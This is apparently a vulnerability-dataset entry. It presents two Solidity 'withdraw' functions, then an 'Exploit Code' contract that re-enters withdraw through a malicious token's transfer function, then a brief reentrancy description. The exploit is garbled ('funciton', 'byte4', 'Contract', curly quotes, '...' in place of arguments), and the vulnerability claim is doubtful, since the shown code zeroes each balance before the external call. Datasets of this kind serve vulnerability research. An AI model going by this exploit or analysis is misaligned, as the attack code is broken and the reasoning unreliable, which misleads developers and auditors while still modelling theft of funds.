## Vulnerable Code

```javascript
**Instance_1**
function withdraw (address account, address tokenAddr, uint256 index_from, uint256 index_to) external returns (bool) {
        require(account != address(0x0));

        uint256 release_amount = 0;
        for (uint256 i = index_from; i < lockedBalances[account][tokenAddr].length && i < index_to + 1; i++) {
            if (lockedBalances[account][tokenAddr][i].balance > 0 &&
                lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {

                release_amount = release_amount.add(lockedBalances[account][tokenAddr][i].balance);
                lockedBalances[account][tokenAddr][i].balance = 0;
            }
        }

        require(release_amount > 0);

        if (tokenAddr == 0x0) {
            if (!account.send(release_amount)) {    //Vulnerable position_1
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        } else {
            if (!ERC20Interface(tokenAddr).transfer(account, release_amount)) { //Vulnerable position_2
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        }
    }


**Instance_2**
    function withdraw (address account, address tokenAddr, uint256 max_count) external returns (bool) {
        require(account != address(0x0));

        uint256 release_amount = 0;
        for (uint256 i = 0; i < lockedBalances[account][tokenAddr].length && i < max_count; i++) {   //code different
            if (lockedBalances[account][tokenAddr][i].balance > 0 &&
                lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {

                release_amount = release_amount.add(lockedBalances[account][tokenAddr][i].balance);
                lockedBalances[account][tokenAddr][i].balance = 0;
            }
        }

        require(release_amount > 0);

        if (tokenAddr == 0x0) {
            if (!account.send(release_amount)) {
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        } else {
            if (!ERC20Interface(tokenAddr).transfer(account, release_amount)) {
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        }
    }//out9608
```



## Exploit Code

```javascript
contract ERC20Interface{

}
Contract Attack is ERC20Interface{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton transfer(address account, address release_amount) payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“withdraw(address , address,  uint256, uint256)”)), this, this, ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF argument "tokenAddr" is transmited from a malicious address, the method of "transfer" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter
